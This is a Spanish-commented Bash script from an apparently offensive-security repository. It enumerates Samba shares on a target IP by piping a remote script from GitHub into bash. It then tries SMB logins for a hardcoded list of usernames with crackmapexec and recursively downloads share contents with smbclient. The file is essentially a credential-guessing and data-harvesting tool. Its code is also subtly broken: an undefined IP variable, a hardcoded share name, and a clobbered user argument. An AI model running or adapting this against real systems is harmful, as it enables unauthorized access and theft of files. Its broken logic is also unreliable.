#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para descargar los archivos de los shares encontrados con el script de listar shares
#
# Ejecución remota (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Samba-4-DescargarArchivosDeSharesEnIP-User.sh | bash -s 'IPServSamba' 'Usuario' 'Password'
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Samba-4-DescargarArchivosDeSharesEnIP-User.sh | sed 's-sudo--g' | bash -s 'IPServSamba' 'Usuario' 'Password'
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Samba-4-DescargarArchivosDeSharesEnIP-User.sh | nano -
# ----------

# Definir constantes de color
  cColorAzul="\033[0;34m"
  cColorAzulClaro="\033[1;34m"
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

# Definir la cantidad de argumentos esperados
  cCantParamEsperados=3

# Comprobar que se hayan pasado la cantidad de parámetros correctos. Abortar el script si no.
  if [ $# -ne $cCantParamEsperados ]
    then
      echo ""
      echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
      echo ""
      if [[ "$0" == "bash" ]]; then
        vNombreDelScript="script.sh"
      else
        vNombreDelScript="$0"
      fi
      echo "    $vNombreDelScript [IPServSamba] [Usuario] [Password]"
      echo ""
      echo "  Ejemplo:"
      echo ""
      echo "    $vNombreDelScript '10.10.76.111' 'guest' 'Default_2025!'"
      echo ""
      exit
  fi

vIPServSamba="$1"
vUsuario="$2"
vPassword="$3"

# Guardar los shares obtenidos con el otro script
  aSharesEncontrados=($(curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/1-Reconnaissance/Samba-1-ListarSharesEnIP.sh | bash -s "$vIPServSamba" "$vUsuario" | cut -d':' -f2 | sed 's/^[ \t]*//'))

# Descargar contenido de cada share
#  for vNombreDelShare in "${aSharesEncontrados[@]}"; do
#    echo -e "\n===== Nombre del share: $vNombreDelShare =====\n"
#    mkdir -p Share-"$vNombreDelShare"
#    smbclient "//$vIPServSamba/$vNombreDelShare" -N -c "lcd Share-$vNombreDelShare; recurse; prompt; mget *.*"
#  done


aUsuarios=(arlina roberto guest)

# Descargar contenido de cada share
  for vNombreDelShare in "${aSharesEncontrados[@]}"; do
    echo -e "\n===== Nombre del share: $vNombreDelShare =====\n"
    for vUsuario in "${aUsuarios[@]}"; do
      echo -e "\n===== Probando login con usuario: $vUsuario =====\n"
      # Intentar autenticación SMB
      vSalida=$(crackmapexec smb "$vIP" -u "$vUsuario" -p "$vPassword" 2>/dev/null)
      if echo "$vSalida" | grep -q "\[+\]"; then
        echo "[+] Login exitoso con el usuario $vUsuario. Intentando descargar archivos..."
        # Crear carpeta para el share y usuario
          mkdir -p Share-"$vNombreDelShare"/"$vUsuario"
        # Con smbclient descarga recursiva en la carpeta del usuario
          smbclient "//$vIPServSamba/it" -U "$vUsuario%$vPassword" -c "lcd Share-$vNombreDelShare/$vUsuario; recurse; prompt; mget *.*"
          echo "[+] Descarga completada en ./Share-$vNombreDelShare/$vUsuario/"
      else
        echo "[-] Login fallido con el usuario $vUsuario."
      fi
    done
  done

